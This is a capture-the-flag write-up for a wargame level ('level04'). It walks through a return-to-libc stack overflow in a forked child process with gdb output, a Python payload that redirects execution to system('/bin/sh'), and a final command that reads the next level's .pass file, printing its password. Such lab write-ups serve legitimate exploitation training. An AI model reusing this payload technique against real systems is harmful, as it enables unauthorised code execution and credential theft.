So first of all, we see the binary is compiled with NX so the stack cannot execute arbitrary code. But the buffer can be easily overflowed in the child to overwrite the eip so we can execute `system` with `/bin/sh` through the environment (so we can reference a string in the stack). \
In gdb, we need to `set follow-fork-mode child` to be able to examine the child stack and find where the eip is in the child.
```shell
(gdb) set follow-fork-mode child

(gdb) b *main+155
Breakpoint 2 at 0x8048763

(gdb) r < <(python -c 'print "A"*200')
[New process 2643]
Give me some shellcode, k
[Switching to process 2643]

Breakpoint 2, 0x08048763 in main ()
(gdb) child is exiting...
x/48wx $esp
0xffffd630:     0xffffd650      0x00000000      0x00000000      0x00000000
0xffffd640:     0x00000b80      0x00000000      0xf7fdc714      0x00000000
0xffffd650:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd660:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd670:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e0:     0x41414141      0x41414141      0x41414141      0x41414141
                                                |_ the ebp      |_ the eip
(gdb) x/wx $ebp
0xffffd6e8:     0x41414141

(gdb) x/5s *((char **)environ)
0xffffd8c4:      "SHELLCODE=/bin/sh"
0xffffd8d6:      "SHELL=/bin/bash"
0xffffd8e6:      "TERM=screen-256color"
0xffffd8fb:      "SSH_CLIENT=10.11.2.7 49801 4242"
0xffffd91b:      "SSH_TTY=/dev/pts/0"

(gdb) p system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) quit

$ # The address for /bin/sh is 0xffffd8c4 + length("SHELLCODE=") (a)
$ # which actually is 0xffffd8ce
bash$ ./level04 < <(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x90\x90\x90\x90" + "\xce\xd8\xff\xff"')
Give me some shellcode, k
child is exiting...
bash$ sh: 1: h: not found
^C

$ # the address has a little offset so we try to find the right address by hand
bash$ ./level04 < <(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x90\x90\x90\x90" + "\xc9\xd8\xff\xff"')
Give me some shellcode, k
child is exiting...
bash$ sh: 1: bin/sh: Permission denied

$ # as we need to keep stdin open to run commands in the shell, we need to cat the exploit
bash$ python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x90\x90\x90\x90" + "\xc8\xd8\xff\xff"' > /tmp/exploit
bash$ cat /tmp/exploit - | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
